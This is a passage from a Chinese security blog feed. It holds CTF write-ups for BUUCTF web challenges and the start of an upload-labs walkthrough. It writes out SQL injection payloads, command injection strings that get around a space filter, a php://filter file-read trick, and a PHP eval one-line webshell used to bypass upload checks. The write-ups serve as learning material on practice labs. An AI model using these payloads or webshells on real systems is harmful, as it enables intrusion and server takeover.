class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd ../../../;cat flag</span><br></pre></td></tr></table></figure><p>得到 flag</p><p 6aa87974-be97-4519-a4a1-2820fbc664dd>flag</p><h2 id="强网杯-2019随便注1"><a class="markdownIt-Anchor" href="#强网杯-2019随便注1">#</a> [强网杯 2019] 随便注 1</h2><h3 id="解题"><a class="markdownIt-Anchor" href="#解题">#</a> 解题</h3><p>打开题目可以看出是一道 sql 注入题</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/q.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/q.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>1’报错回显，闭合单引号</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/r.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/r.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>order by 查字段，只显示两列，order by 3 时如图</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/s.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/s.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查表 1’;show tables;#</p><p><img src alt></p><p>可以看到有两个表，分别是 1919810931114514 和 words</p><p>依次查两个表的字段</p><p>这里在查这个全数字的表时遇到问题了，这个数值我直接 from 1919810931114514 无法查询，form '1919810931114514’也不能查询，通过一个博客的记录学到了</p><blockquote><p>关于在这里使用 ` 而不是 ’ 的一些解释：</p><p>两者在 linux 下和 windows 下不同，linux 下不区分，windows 下区分。</p><p>单引号 ’ 或双引号主要用于 字符串的引用符号</p><p>反勾号 ` 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc 下面的键)</p><p>有 MYSQL 保留字作为字段的，必须加上反引号来区分！！！</p><p>如果是数值，请不要使用引号。</p><p>原文链接：<a href="https://blog.csdn.net/m0_62879498/article/details/123292860">https://blog.csdn.net/m0_62879498/article/details/123292860</a></p></blockquote><p>words 表直接 from words 就可以查询了或者反勾号，单引号是不行的</p><p>表 1919810931114514</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/u.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/u.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>表 words</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/v.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/v.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>显而易见 flag 在 1919810931114514 中</p><p>爆出来了 flag 字段</p><p>通过爆出的这两个表的内容可以看到 words 表有 id 和 data 两个属性</p><p>我们查询框中输入 1 查询出来的内容也具有两个属性</p><p>而 1919810931114514 这个表中只有一个属性 flag</p><p>这时候我们可以把 1919810931114514 表命名为 words，把原来的 words 命名为其他名字比如说 word1</p><p>改完名字后新的 words 把 flag 改名为 id 然后直接查询就好了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://86dfb45e-acb1-49e0-aa36-be2cd7e0896b.node4.buuoj.cn:81/?inject=1&#x27;;rename table `words` to word1;rename table `1919810931114514` to `words`;alter table words change flag id varchar(100);#</span><br></pre></td></tr></table></figure><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/w.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/w.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>更改成功后我们也可以通过 show tables，show columns from words 等来查询是否更改成功，我就不一一列出了</p><p>我直接查询</p><p>1’ or 1=1#</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/x.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/x.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到 flag</p><h3 id="知识点归纳"><a class="markdownIt-Anchor" href="#知识点归纳">#</a> 知识点归纳</h3><h4 id="show"><a class="markdownIt-Anchor" href="#show">#</a> show</h4><p>在过滤了 select 和 where 的情况下，还可以使用 show 来爆出数据库名，表名，和列名。</p><pre><code>show datebases; //数据库。show tables; //表名。show columns from table; //字段。xxxxxxxxxx show columns from table; //字段。1</code></pre><h4 id="alter"><a class="markdownIt-Anchor" href="#alter">#</a> alter</h4><p>作用：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）</p><p>用法：</p><ul><li><p>添加一个列</p><p>alter table &quot; table_name&quot; add &quot; column_name&quot;  type;</p></li><li><p>删除一个列</p><p>alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;</p></li><li><p>改变列的数据类型</p><p>alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;</p></li><li><p>改列名</p><p>alter table &quot; table_name&quot; change &quot; column1&quot; &quot; column2&quot; type;</p><p>alter table “table_name” rename “column1” to “column2”;</p></li></ul><p>学习链接：<a href="https://blog.csdn.net/qq_44657899/article/details/103239145">https://blog.csdn.net/qq_44657899/article/details/103239145</a></p><h2 id="suctf-2019easysql-1"><a class="markdownIt-Anchor" href="#suctf-2019easysql-1">#</a> [SUCTF 2019]EasySQL 1</h2><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/y.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/y.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>输入 1</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>1’ or ‘1’='1</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z01.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z01.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>1’ order by 1#</p><p>也都无效反回 Nonono</p><p>基于时间的盲注和报错注入都需要嵌套联合查询语句来实现，因此可以跳过，直接试试布尔型盲注</p><p>1’ and length(database())&gt;=1</p><p>还是 Nonono</p><p>尝试堆叠注入</p><p>1;show databases;</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z02.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z02.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>1;show tables;</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z03.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z03.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>接下来是网上的两种解法</p><p><strong>第一种</strong></p><p>是猜出了源码<strong> select $_POST [‘query’] || flag from Flag</strong></p><p>sql_mode <strong>设置了 PIPES_AS_CONCAT 时</strong>，|| 就是字符串连接符，相当于 CONCAT () 函数<br>当 sql_mode <strong>没有设置 PIPES_AS_CONCAT 时</strong> （默认没有设置），|| 就是逻辑或，相当于 OR 函数<br>第一种就按默认没有配置来进行，此时 || 就是逻辑或<br> || 在命令执行中见过，<br><strong>回顾:</strong><br>command1;command2 顺序执行<br> command1 || command2<br> 如果 command1 执行失败，则执行 command2<br>command1 &amp;&amp; command2<br> 如果 command1 执行成功，则执行 command2</p><p>因此只需要将 **$_POST [‘query’]** 提交的数据换成 *,1 (如果直接写 * 的话会被报错，且 * 写在后面会失效)</p><p>代入猜出的源码中（拼接语句）:<br>sql=select.post[‘query’].&quot;||flag from Flag&quot;;<br> 如果 $post [‘query’] 的数据为 *,1</p><p>sql 语句就变成了 select *,1||flag from Flag</p><p>就是 select *,1 from Flag，这样就直接查询出了 Flag 表中的所有内容。<br>此处的 1 是临时增加一列，列名为 1 且这一列的所有值都为 1</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z04.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到 flag</p><p><strong>第二种</strong></p><p>第二种是将 || 作为字符串连接符，因此需要在语句中更改其配置<br> sql_mode=PIPES_AS_CONCAT 时即可<br> Payload:1;set sql_mode=PIPES_AS_CONCAT;select 1<br> 拼接完之后：select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag<br> 相当于是 select 1 from Flag 和 select flag from Flag</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z05.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="gxyctf2019ping-ping-ping-1"><a class="markdownIt-Anchor" href="#gxyctf2019ping-ping-ping-1">#</a> [GXYCTF2019]Ping Ping Ping 1</h2><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z06.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>从页面可以看到本题要我们构造 ip</p><p>用 127.0.0.1 加上管道符和 linux 常用命令 ls 试试</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z08.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z08.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>构造？ip=127.0.0.1;ls</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z07.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z07.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>直接可以看到 flag.php</p><p>cat 连接它试试</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z09.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z09.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>清楚的看到空格被过滤了</p><p>这里就要提到绕过空格的方法了</p><blockquote><ol><li><p>${IFS} 替换</p></li><li><p>$IFS$1替换</p></li><li><p>${IFS       替换</p></li><li><p>%20        替换</p></li><li><p>&lt;和 &lt;&gt; 重定向符替换</p></li><li><p>%09        替换</p></li></ol></blockquote><p>一个个尝试可知 $IFS$1 是可行的</p><p>所以构造？ip=127.0.0.1;cat$IFS$1flag.php</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z10.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>flag 也被过滤</p><p>试试 index</p><p>?ip=127.0.0.1;cat$IFS$1index.php</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z11.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>大部分符号都被过滤了</p><p>从大佬学习到了构造这个 payload</p><p>?ip=127.0.0.1;a=g;cat$IFS<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi>f</mi><mi>l</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">1fla</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span></span></span></span>a.php</p><p>我对这个代码的理解就是先构造一个参数 a（名字都是可以的，我尝试把 a 换成 b 也是能获得 flag 的），让参数 a=g，然后 get 到 ip 之后执行语句，把 fla<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mtext>里的参数</mtext></mrow><annotation encoding="application/x-tex">a.php里的参数</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">a</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span></span></span></span> a 替换成 g 构造除 flag 这个单词做到绕过 flag 的过滤</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z12.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>拿下 flag</p><h2 id="极客大挑战-2019secret-file-1"><a class="markdownIt-Anchor" href="#极客大挑战-2019secret-file-1">#</a> [极客大挑战 2019] Secret File 1</h2><p>进入页面</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z13.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>F12 看到这个 Archive_room.php 这个文件访问</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z14.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>​</p><p>点击按钮</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z17.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>没有获得有用的信息</p><p>用 bp 抓包一下</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z15.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>有一个被注释的 php 文件</p><p>访问</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z16.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>审计代码利用 php 伪协议 filter 获取 base64 加密的 flag.php 文件的内容后解码</p><p>得到 flag</p><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z18.png" class="lazyload" data-srcset="/2023/04/06/buuctf%E5%88%B7%E9%A2%98/z18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;我就在这里&quot;;</span><br><span class="line">                $flag = &#x27;flag&#123;c036159a-0f38-4284-a194-7c6b38b1d453&#125;&#x27;;</span><br><span class="line">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>拿下 flag</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;因为校赛要开始了，所以来刷刷题多见见世面&lt;/p&gt;</summary>
    
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/categories/buuctf/"/>
    
    
    <category term="buuctf" scheme="https://dr4x3zz.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs</title>
    <link href="https://dr4x3zz.github.io/2023/04/05/upload-labs/"/>
    <id>https://dr4x3zz.github.io/2023/04/05/upload-labs/</id>
    <published>2023-04-05T09:41:11.000Z</published>
    <updated>2024-01-21T11:35:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>upload-labs 是一个使用 <code>php</code>  语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场。</p><p><img src="/2023/04/05/upload-labs/1.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><span id="more"></span><h2 id="文件上传漏洞原理"><a class="markdownIt-Anchor" href="#文件上传漏洞原理">#</a> 文件上传漏洞原理</h2><h3 id="成因"><a class="markdownIt-Anchor" href="#成因">#</a> 成因</h3><p>1、服务器配置不当会导致任意文件上传<br> 2、web 应用开放了文件上传的功能，并对上传的文件没有进行足够的限制和过滤<br> 3、web 应用开放了文件上传功能，虽然在开发时加入了一定的过滤功能，但并不严格，可以被绕过<br> 4、上传文件时如果服务端代码未对客户端上传的文件进行严格的验证和过滤，就容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp 等格式的文件）。</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84593150">(1 条消息) php、jsp、asp 和 aspx 的区别_谢公子的博客 - CSDN 博客</a></p><p>链接中对四个后缀名不同的文件有详细介绍</p><h3 id="漏洞产生条件"><a class="markdownIt-Anchor" href="#漏洞产生条件">#</a> 漏洞产生条件</h3><p>1、web 服务器要开启文件上传功能，并且上传 API（接口）对外开放，即 web 用户可以访问；<br>2、web 用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，web 目录都具有执行权限；<br>3、我们上传的文件在服务器的系统环境里能够正常运行，即 web 容器能够解析我们上传的脚本，不论脚本以什么样的形式存在。</p><h3 id="危害"><a class="markdownIt-Anchor" href="#危害">#</a> 危害</h3><p>恶意的脚本文件，又被称为 webshell，webshell 脚本称为一种网页后门，webshell 脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件、执行系统命令等</p><blockquote><p>学习来源学长的博客：<a href="https://hwwg.github.io/2020/12/17/upload-labs1/">upload-labs1 - Tlife (hwwg.github.io)</a></p></blockquote><h2 id="pass-01"><a class="markdownIt-Anchor" href="#pass-01">#</a> Pass-01</h2><p><img src="/2023/04/05/upload-labs/2.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>从代码就可以看出上传文件的类型被限制了，如果我们上传了一个除.jpg|.png|.gif 这三个后缀名的文件会被提示</p><p><img src="/2023/04/05/upload-labs/3.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h3 id="方法一"><a class="markdownIt-Anchor" href="#方法一">#</a> 方法一</h3><p>我们先新建一个 txt 文件，输入 php 一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;uploadlabs&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/05/upload-labs/4.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>我们链接这个一句话木马的密码就是 uploadlabs</p><p>把这个 txt 后缀改为允许上传的三个文件后缀名</p><p>这里我把它改为.jpg</p><p>这时候上传再用 burp 抓包，将其后缀名改为 php</p><p><img src="/2023/04/05/upload-labs/5.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>把 jpg 改为 php 再放包</p><p><img src="/2023/04/05/upload-labs/6.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>右击图片在新标签页打开</p><p>测试是否上传成功</p><p><img src="/2023/04/05/upload-labs/7.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这里可以看到一句话木马上传的路径，让密码等于 phpinfo ()</p><p>然后使用蚁剑连接一句话木马</p><p><img src="/2023/04/05/upload-labs/8.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>测试链接，成功后添加，就可以对目标进行操作了</p><h3 id="方法二"><a class="markdownIt-Anchor" href="#方法二">#</a> 方法二</h3><p><img src="/2023/04/05/upload-labs/9.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看网页源代码，可以发现是 javascript 前端验证，直接把 javascript 禁用就可以上传，尝试一下</p><p>F12-&gt; 调试器 -&gt; 设置 -&gt; 禁用 javascript</p><p><img src="/2023/04/05/upload-labs/10.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>直接上传一个 php 后缀的一句话木马文件</p><p>剩余的步骤和方法一一致不再复述一遍了</p><h2 id="pass-02"><a class="markdownIt-Anchor" href="#pass-02">#</a> Pass-02</h2><p>进入页面发现还是需要上传一个文件，我们先上传看看回显情况。上传了一个文件名后缀为.php 的文件后提示类型错误，错误回显的方式不是弹窗，是页面直接提示，所以不是前端验证。</p><blockquote><p>本关提示为：本 pass 在服务端对数据包的 MIME 进行检查！</p></blockquote><h3 id="mime"><a class="markdownIt-Anchor" href="#mime">#</a> MIME</h3><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</p><p>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理 URL，因此 Web 服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p><blockquote><table><thead><tr><th style="text-align:center">文件扩展名</th><th style="text-align:center">Mime-Type</th></tr></thead><tbody><tr><td style="text-align:center">.js</td><td style="text-align:center">application/x-javascript</td></tr><tr><td style="text-align:center">.html</td><td style="text-align:center">text/html</td></tr><tr><td style="text-align:center">.jpg</td><td style="text-align:center">image/jpeg</td></tr><tr><td style="text-align:center">.pdf</td><td style="text-align:center">application/pdf</td></tr><tr><td style="text-align:center">.png</td><td style="text-align:center">image/png</td></tr></tbody></table></blockquote><h3 id="content-type"><a class="markdownIt-Anchor" href="#content-type">#</a> Content-Type</h3><p>Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，这就是经常看到一些 PHP 网页点击的结果却是下载一个文件或一张图片的原因。</p><p>Content-Type 标头告诉客户端实际返回的内容的内容类型。</p><p>常见的媒体格式类型如下：</p><ul><li>text/html ： HTML 格式</li><li>text/plain ：纯文本格式</li><li>text/xml ： XML 格式</li><li>image/gif ：gif 图片格式</li><li>image/jpeg ：jpg 图片格式</li><li>image/png：png 图片格式</li></ul><p>以 application 开头的媒体格式类型：</p><ul><li>application/xhtml+xml ：XHTML 格式</li><li>application/xml： XML 数据格式</li><li>application/atom+xml ：Atom XML 聚合格式</li><li>application/json： JSON 数据格式</li><li>application/pdf：pdf 格式</li><li>application/msword ： Word 文档格式</li><li>application/octet-stream ： 二进制流数据（如常见的文件下载）</li><li>application/x-www-form-urlencoded ： <form enctype="””">中默认的 encType，form 表单数据被编码为 key/value 格式发送到服务器（表单默认的提交数据的格式）</form></li></ul><p>另外一种常见的媒体格式是上传文件之时使用的：</p><ul><li>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</li></ul><h3 id="方法"><a class="markdownIt-Anchor" href="#方法">#</a> 方法</h3><h4 id="方法一-2"><a class="markdownIt-Anchor" href="#方法一-2">#</a> 方法一</h4><p>和 pass-01 一样先上传一个有一句话木马的 txt 将后缀修改为 jpg</p><p><img src="/2023/04/05/upload-labs/11.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这时候可以看到 content-type 已经为 image/jpeg 避开过滤了</p><p>把后缀改为 php</p><p>右击图片打开，验证是否上传成功 url?uploadlabs=phpinfo ()</p><p>蚁剑连接</p><h4 id="方法二-2"><a class="markdownIt-Anchor" href="#方法二-2">#</a> 方法二</h4><p>直接上传一个一句话木马的 php 后缀名文件，抓包</p><p><img src="/2023/04/05/upload-labs/12.png" class="lazyload" data-srcset="/2023/04/05/upload-labs/12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>将 Content-Type 改为 image/jpeg</p><p>就可以成功上传了</p><h3 id="源码函数学习"><a class="markdownIt-Anchor" href="#源码函数学习">#</a> 源码函数学习</h3><h4 id="file_exists"><a class="markdownIt-Anchor" href="#file_exists">#</a> file_exists()</h4><p>file_exists — 检查文件或目录是否存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_exists(string $filename): bool</span><br></pre></td></tr></table></figure><h4 id="move_uploaded_file"><a class="markdownIt-Anchor" href="#move_uploaded_file">#</a> move_uploaded_file()</h4><p>move_uploaded_file () 